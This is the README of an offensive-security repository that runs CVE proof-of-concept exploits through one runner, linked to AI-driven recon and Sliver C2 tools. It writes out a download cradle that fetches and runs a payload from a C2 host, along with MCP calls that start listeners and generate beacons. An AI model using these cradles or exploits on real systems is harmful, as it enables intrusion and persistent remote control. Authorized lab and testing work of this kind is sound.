```text
██████╗  ██████╗  ██████╗███████╗
██╔══██╗██╔═████╗██╔════╝██╔════╝
██████╔╝██║██╔██║██║     ███████╗
██╔═══╝ ████╔╝██║██║     ╚════██║
██║     ╚██████╔╝╚██████╗███████║
╚═╝      ╚═════╝  ╚═════╝╚══════╝
   proof-of-concept exploits + offensive helpers · one ./run for everything · sliver staging
```

![python](https://img.shields.io/badge/python-3.8%2B-3776AB?logo=python&logoColor=white)
![interface](https://img.shields.io/badge/interface-one%20uniform%20runner-7C3AED)
![deps](https://img.shields.io/badge/dependencies-stdlib%20only-000000)
![sliver](https://img.shields.io/badge/Sliver-staging%20cradle-000000)
![license](https://img.shields.io/badge/license-educational%20%2F%20authorized%20use-3DA639)

**A uniform home for proof-of-concept exploits and offensive helpers, each runnable the same way
through one tiny runner.** CVE PoCs and plain utilities (key converters, decoders, protocol
clients) live side by side. One `./run`, one metadata format, zero third-party dependencies.

It is the **bespoke-exploit drawer of the AI-offsec stack**: when [p0rtix](https://github.com/v0idravl/p0rtix) surfaces an exploit candidate, the matching PoC can inject a Sliver download cradle via `--stage-sliver <url>`, calling the beacon home through [sliver-mcp](https://github.com/v0idravl/sliver-mcp) the moment the exploit lands.

> ⚠️ **Authorized use only.** Owned labs, CTF / graded boxes (HTB · PG · THM · pwn.college), and
> explicitly authorized assessments under written scope. Every entry takes its target as an option —
> **none hardcode one** — and the runner refuses to launch without the required ones. Read the
> source before you run anything against a host.

---

## ⚡ Quick start

```bash
git clone git@github.com:v0idravl/p0cs.git && cd p0cs

./run --list                                    # every PoC and helper
./run --show cve-2025-32432                      # one entry's options + usage
./run cve-2025-32432 RHOST=target.example.com    # run it (options as KEY=VALUE)
```

No virtualenv, no `pip install` — the runner is pure Python stdlib. Individual PoCs may pull a
library; each entry's `README.md` says so.

---

## 🧠 What it does

One runner reads a per-entry `metadata.yaml` and drives heterogeneous scripts — positional args,
argparse flags, python / ruby / bash — through a single `KEY=VALUE` interface. The same `./run`
that fires a pre-auth RCE also runs a `.ppk` key converter; nothing about the calling convention
changes between them.

- **Uniform interface** — `./run <slug> RHOST=… RPORT=… CMD='id'`, regardless of how the
  underlying script wants its arguments. The runner validates required options before exec and
  builds the exact argv from an `argv_template`.
- **Exploits and helpers side by side** — `pocs/` holds exploits + auxiliary checks, `tools/`
  holds plain offensive utilities (converters, decoders, clients). Same shape, same runner, listed
  together.
- **Sliver staging** — pass `--stage-sliver <url>` to inject a download cradle before exec; the
  exploit delivers the beacon in the same shot.
- **Scaffolds for new entries** — `./run --new <slug>` stamps a directory from `templates/` so
  every PoC is born in the right shape.
- **Zero dependencies, evidence-safe defaults** — stdlib-only runner; `.gitignore` keeps dumps,
  keys, loot, and real target lists out of the repo by default.

---

## 🧩 Part of the AI-offsec stack

p0cs is the **custom-exploit drawer** the rest of the stack reaches into when no packaged module
exists. The recon → exploitation → C2 chain stays the same; p0cs just supplies the missing weapon
in a drivable shape.

```text
p0rtix      recon / enum / test-access / offline-crack + the green->yellow->red noise floor
  └─ p0cs   bespoke PoCs with --stage-sliver cradle injection when there's no stock module  (you are here)
sliver-mcp  Sliver C2 via sliver-mcp — listeners, beacons, sessions, execution, routes
dagar-red   ATT&CK adversary-emulation skills — the judgment about which call to make next
```

A p0rtix `export_handoff` exploit candidate with a CVE but no stock module is exactly the gap
p0cs fills: write the PoC here and `--stage-sliver` hands the beacon to
[sliver-mcp](https://github.com/v0idravl/sliver-mcp) the moment the exploit lands. See
[dagar-red](https://github.com/v0idravl/dagar-red) for the orchestration.

---

## 📦 Layout

```text
run                     one uniform entrypoint for everything (see below)
pocs/<slug>/            exploits + auxiliary checks   — poc.py + metadata.yaml + README.md
tools/<slug>/           helpers (converters, decoders, clients) — same shape
templates/              scaffolds: poc.py, metadata.yaml, README.md
```

Each entry carries a `metadata.yaml` so the runner can drive it without knowing anything about the
script in advance:

| Field | Purpose |
|---|---|
| `id` | slug (defaults to the directory name) |
| `cve` | CVE identifier, or `~` for helpers |
| `name` | one-line human description |
| `type` | `exploit` · `auxiliary` · `helper` |
| `lang` | `python` · `ruby` · `bash` · `sh` — picks the interpreter |
| `entrypoint` | script to exec (default `poc.py`) |
| `options` | the full option vocabulary (shown by `--show`) |
| `required` | options the runner enforces before launching |
| `argv_template` | how to turn `KEY=VALUE` into the script's real argv (`{KEY}` placeholders) |

Options are also exported to the script's environment as `P0C_<KEY>`, for PoCs that prefer reading
env over argv.

---

## 🚀 Use

```bash
./run --list                                    # every PoC and helper
./run --show cve-2025-32432                      # one entry's options + usage
./run cve-2025-32432 RHOST=target.example.com    # run it (options as KEY=VALUE)
./run ppk-to-openssh PPK=key.ppk > id_rsa        # a helper, same interface
./run --new my-poc                               # scaffold a new PoC (add `tool` for a helper)
./run --stage-sliver https://c2.example.com/s cve-2025-32432 RHOST=target.example.com
                                                # inject Sliver cradle, stage beacon on exploit
```

| Flag | Description |
|---|---|
| `--list` | Print all registered PoCs and helpers |
| `--show <slug>` | Print one entry's options and usage |
| `--new <slug>` | Scaffold a new entry from templates |
| `--stage-sliver <url>` | Inject a Sliver download cradle (`curl -sk <url> \| bash`) before execution — stages the beacon on exploit |

The runner prints the exact command it execs to stderr (`[p0cs] <slug>: …`) so the underlying
invocation is never hidden.

---

## ➕ Adding an entry

1. `./run --new <slug>` (append `tool` for a helper) — scaffolds the dir from `templates/`.
2. Write the PoC, fill `metadata.yaml` — set `required` + `argv_template` to match its real CLI.
3. `./run --list` to confirm it registers.

Keep the rule the repo is built on: **the target is always an option, never a literal in the
source.**

---

## 🦾 Sliver staging

`--stage-sliver <url>` prepends a download cradle to the exploit execution chain:

```bash
./run --stage-sliver https://c2.example.com/s cve-2025-32432 RHOST=target.example.com
```

The runner injects `curl -sk <url> | bash` before the exploit fires — so the moment the exploit
lands RCE, the target calls home to the Sliver listener. The listener and implant are managed
through [sliver-mcp](https://github.com/v0idravl/sliver-mcp). Typical workflow:

```bash
# 1. spin up an HTTPS listener via sliver-mcp
mcp__sliver__start_https_listener(host="0.0.0.0", port=443)

# 2. generate a beacon and host the stager URL
mcp__sliver__generate_beacon(c2_url="https://your-c2/", name="htb-target")

# 3. fire the exploit with staging
./run --stage-sliver https://your-c2/stage cve-2025-32432 RHOST=target.example.com
```

---

## 📓 Current entries

| Slug | Type | CVE | What |
|---|---|---|---|
| `cve-2025-32432` | exploit | CVE-2025-32432 | Craft CMS image-transform pre-auth RCE (check + RCE) |
| `cve-2023-46604` | exploit | CVE-2023-46604 | Apache ActiveMQ OpenWire RCE |
| `cve-2023-32784` | auxiliary | CVE-2023-32784 | KeePass 2.x master password from a memory dump (offline) |
| `ppk-to-openssh` | helper | — | PuTTY `.ppk` → OpenSSH private key, no `puttygen` |

---

## 🩹 Troubleshooting

| Symptom | Fix |
|---|---|
| `unknown PoC '<slug>'` | `./run --list` for the exact slug — it's the `id:` in `metadata.yaml`, not necessarily the dir name. |
| `missing required option(s): …` | Pass every option in `required`. `./run --show <slug>` prints the usage line. |
| `bad option 'x' — expected KEY=VALUE` | Options are `KEY=VALUE` pairs; quote values with spaces (`CMD='id; uname -a'`). |
| `unknown lang '…'` | `metadata.yaml`'s `lang` must be one of `python` · `ruby` · `bash` · `sh`. |
| Sliver beacon doesn't call back | Confirm the listener is up via `mcp__sliver__list_jobs` and the stager URL is reachable from target. |
| A PoC errors on import | The runner is stdlib-only, but individual PoCs may need a library — check that entry's `README.md`. |

---

## License

For **educational and authorized testing purposes only** — see [`LICENSE`](LICENSE). Use
responsibly, preserve evidence, and operate only within written scope. Every entry is
authorized-use-only by declaration (`authorized_use_only: true`) and takes its target as a runtime
option.
